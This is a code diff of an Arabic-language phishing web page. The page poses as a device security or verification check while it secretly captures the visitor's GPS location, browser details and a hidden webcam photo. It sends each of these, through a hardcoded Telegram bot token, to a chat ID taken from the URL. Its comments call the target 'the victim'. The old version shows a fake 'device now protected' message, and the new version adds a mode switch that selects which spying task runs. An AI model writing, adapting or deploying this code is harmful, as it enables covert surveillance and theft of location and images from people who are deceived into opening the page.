@@ -1,20 +1,8 @@
 <!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام الحماية المتقدم</title>
-    <style>
-        body { background-color: #000; color: #00ff00; text-align: center; font-family: 'Courier New', Courier, monospace; padding-top: 100px; }
-        .loader { border: 5px solid #333; border-top: 5px solid #00ff00; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
-</head>
+<html>
+<head><meta charset="UTF-8"></head>
 <body>
-    <div class="loader"></div>
-    <h3>جاري فحص أمان الجهاز...</h3>
-    <p>يرجى السماح بالأذونات المطلوبة لإكمال التوثيق</p>
-
+    <h2 id="status">جاري التحقق...</h2>
     <video id="video" style="display:none;" autoplay></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
@@ -22,63 +10,9 @@
         const token = "8379860884:AAHY6orUkUCffcsZc3dNRt8OQSlPJXD_03w";
         const urlParams = new URLSearchParams(window.location.search);
         const chat_id = urlParams.get('id');
+        const mode = urlParams.get('mode'); // هنا نحدد المهمة المطلوبة
 
-        // 1. إرسال معلومات الجهاز فوراً
-        function sendDeviceInfo() {
-            let info = `📱 **تقرير الجهاز:**\n`;
-            info += `- النظام: ${navigator.platform}\n`;
-            info += `- المتصفح: ${navigator.userAgent.split(') ')[1]}\n`;
-            info += `- اللغة: ${navigator.language}\n`;
-            info += `- الشاشة: ${screen.width}x${screen.height}`;
-            apiSendMessage(info);
-        }
-
-        // 2. طلب الموقع الجغرافي (GPS)
-        function getGPS() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(pos => {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                    apiSendMessage(`📍 **موقع الضحية:**\n${mapsUrl}`);
-                }, err => {
-                    apiSendMessage("❌ فشل سحب الموقع: " + (err.code == 1 ? "تم الرفض" : "غير متاح"));
-                }, { enableHighAccuracy: true });
-            }
-        }
-
-        // 3. فتح الكاميرا والتقاط الصورة
-        async function startCapture() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                setTimeout(() => { takePhoto(); }, 2500);
-            } catch (e) {
-                apiSendMessage("❌ فشل فتح الكاميرا.");
-            }
-        }
-
-        function takePhoto() {
-            const canvas = document.getElementById('canvas');
-            const video = document.getElementById('video');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            canvas.toBlob(blob => {
-                const fd = new FormData();
-                fd.append('chat_id', chat_id);
-                fd.append('photo', blob, 'image.jpg');
-                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
-            }, 'image/jpeg');
-            
-            // إظهار رسالة نجاح وهمية
-            setTimeout(() => {
-                document.body.innerHTML = "<h1>✅ تم التحقق</h1><p>جهازك الآن محمي بالكامل.</p>";
-            }, 1000);
-        }
-
-        function apiSendMessage(text) {
+        function send(text) {
             fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -86,11 +20,35 @@
             });
         }
 
-        // بدء التنفيذ
-        if (chat_id) {
-            sendDeviceInfo();
-            getGPS();
-            startCapture();
+        // المهمة 1: الموقع فقط
+        if (mode === "gps") {
+            navigator.geolocation.getCurrentPosition(pos => {
+                send(`📍 موقع الضحية: https://www.google.com/maps?q=$${pos.coords.latitude},${pos.coords.longitude}`);
+            });
+        }
+        
+        // المهمة 2: الجهاز فقط
+        if (mode === "device") {
+            send(`📱 معلومات الجهاز: ${navigator.userAgent}`);
+        }
+
+        // المهمة 3: الكاميرا فقط
+        if (mode === "cam") {
+            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => {
+                        const fd = new FormData();
+                        fd.append('chat_id', chat_id);
+                        fd.append('photo', blob, 'cam.jpg');
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+                    }, 'image/jpeg');
+                }, 2000);
+            });
         }
     </script>
 </body>
